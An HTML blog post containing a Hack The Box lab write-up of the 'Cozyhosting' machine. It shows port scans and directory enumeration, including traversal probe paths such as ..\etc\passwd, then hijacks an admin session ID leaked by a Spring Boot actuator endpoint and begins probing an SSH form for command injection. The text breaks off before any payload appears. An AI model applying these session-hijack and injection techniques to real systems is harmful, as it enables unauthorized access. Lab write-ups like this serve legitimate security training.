@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Cozyhosting (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Cozyhosting from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/cozyhosting/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Cozyhosting (Easy)">
+<meta property="og:description" content="Writeup of Cozyhosting from Hack The Box." />
+<meta property="og:url" content="/posts/cozyhosting/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-10-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/cozyhosting/">HTB Writeup - Cozyhosting (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-10-01</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/rce/">RCE</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Cozyhosting</code> machine is an easy linux box.</p>
+<p><img src="/images/CozyHosting.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap</code> scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.230       
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-09-30 14:48 EDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:16 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 80.00% <span style="color:#66d9ef">done</span>; ETC: 14:50 <span style="color:#f92672">(</span>0:00:14 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.230
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">984</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE          VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open     ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open     http             nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://cozyhosting.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>544/tcp  filtered kshell
+</span></span><span style="display:flex;"><span>1117/tcp filtered ardus-mtrns
+</span></span><span style="display:flex;"><span>1234/tcp open     hotline?
+</span></span><span style="display:flex;"><span>1334/tcp open     writesrv?
+</span></span><span style="display:flex;"><span>3269/tcp filtered globalcatLDAPssl
+</span></span><span style="display:flex;"><span>8383/tcp filtered m2mservices
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 120.32 seconds
+</span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
+</span></span><span style="display:flex;"><span>127.0.0.1       localhost
+</span></span><span style="display:flex;"><span>127.0.1.1       kali
+</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
+</span></span><span style="display:flex;"><span>10.10.11.230    cozyhosting.htb
+</span></span></code></pre></div><h2 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a directory enumeration with <code>ffuf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://cozyhosting.htb/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.0.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://cozyhosting.htb/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 118ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 119ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: asdfjkl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 132ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: error
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 134ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: index
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 139ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: login
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 196ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    * FUZZ: logout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>20476/20476<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">299</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:01:10<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><p>I do another directory enumeration with <code>dirsearch</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ dirsearch -u http://cozyhosting.htb/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.2
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">30</span> | Wordlist size: <span style="color:#ae81ff">10927</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output File: /home/kali/.dirsearch/reports/cozyhosting.htb/-_23-09-30_15-32-24.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Error Log: /home/kali/.dirsearch/logs/errors-23-09-30_15-32-24.log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://cozyhosting.htb/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:25<span style="color:#f92672">]</span> Starting: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:44<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  435B  - /<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\e</span>tc<span style="color:#ae81ff">\p</span>asswd           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  435B  - /a%5c.aspx                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  634B  - /actuator                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    5KB - /actuator/env                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   15B  - /actuator/health                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   48B  - /actuator/sessions                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   10KB - /actuator/mappings                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  124KB - /actuator/beans                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:32:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">401</span> -   97B  - /admin                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:19<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:19<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /engine/classes/swfupload//swfupload.swf          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:19<span style="color:#f92672">]</span> <span style="color:#ae81ff">500</span> -   73B  - /error                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:20<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:21<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /extjs/resources//charts.swf                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:26<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /html/js/misc/swfupload//swfupload.swf            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:28<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   12KB - /index                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /login                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /login.wdm%2e                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:35<span style="color:#f92672">]</span> <span style="color:#ae81ff">204</span> -    0B  - /logout                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:33:58<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  435B  - /servlet/%C0%AE%C0%AE%C0%AF                       
+</span></span><span style="display:flex;"><span>                                                                             
+</span></span><span style="display:flex;"><span>Task Completed
+</span></span></code></pre></div><p>I see this page <code>/actuator/sessions</code>  to leak any session id:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /actuator/sessions <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/1.1 200 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Server: nginx/1.18.0 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date: Sun, 01 Oct 2023 18:59:21 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type: application/vnd.spring-boot.actuator.v3+json
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-XSS-Protection: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Expires: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Frame-Options: DENY
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 248
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{&#34;BC5EE177A2306DBD6A4FEDE269FD315A&#34;:&#34;UNAUTHORIZED&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;E125C54B227177F317CFEDE5AC928596&#34;:&#34;UNAUTHORIZED&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;B12D30E5B3A15CAB80D18AA9FCC2B778&#34;:&#34;UNAUTHORIZED&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;20EDCBE6C9905D775758D2997A7BC920&#34;:&#34;kanderson&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;A6E836A30295E3EC408CDB8CC159A6AA&#34;:&#34;UNAUTHORIZED&#34;}
+</span></span></span></code></pre></div><p>I have discover a session id, now I can use it  to manipulate the sessions in the the login process, I use <code>Cookie Editor</code> extension to insert this value <code>&quot;20EDCBE6C9905D775758D2997A7BC920&quot;</code> in the  <code>Value</code> field, and then I refresh the page</p>
+<h2 id="remote-code-execution">Remote Code Execution<a href="#remote-code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see the <code>Connection settings</code> form, I compile it and I Intercept it:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /executessh <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb/admin</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=&#34;20EDCBE6C9905D775758D2997A7BC920&#34;</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host=127.0.0.1&amp;username=cyber
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">HTTP/1.1 302 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Server: nginx/1.18.0 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Date: Sun, 01 Oct 2023 19:07:13 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Content-Type-Options: nosniff
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-XSS-Protection: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Expires: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Frame-Options: DENY
+</span></span></span></code></pre></div><p>I can try any payload to discover a possible <code>Remote Code Execution</code>, after different attempts I find it:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /executessh <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://cozyhosting.htb/admin</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
